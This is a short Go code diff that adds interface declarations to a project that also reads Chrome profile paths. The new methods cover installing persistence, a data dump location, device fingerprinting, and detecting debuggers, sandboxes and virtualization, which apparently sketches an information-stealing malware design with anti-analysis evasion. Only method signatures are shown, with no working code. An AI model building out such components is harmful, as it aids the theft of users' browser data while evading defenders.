@@ -16,3 +16,20 @@ type ProfileProvider interface {
     GetChromeBasePath() string
     ListProfiles() ([]string, error)
 }
+
+type PersistenceProvider interface {
+    InstallPersistence() error
+    UninstallPersistence()
+    DataDumpLocation() string
+    ProcessLock() bool
+    ProcessUnlock()
+    CheckDeviceFingerprint() bool
+    FingerprintDevice() error
+}
+
+type EnvDetector interface {
+    DetectDebugging() (bool, error)
+    Protector() error
+    DetectSandbox() bool
+    VirtualizationSystem() string
+}
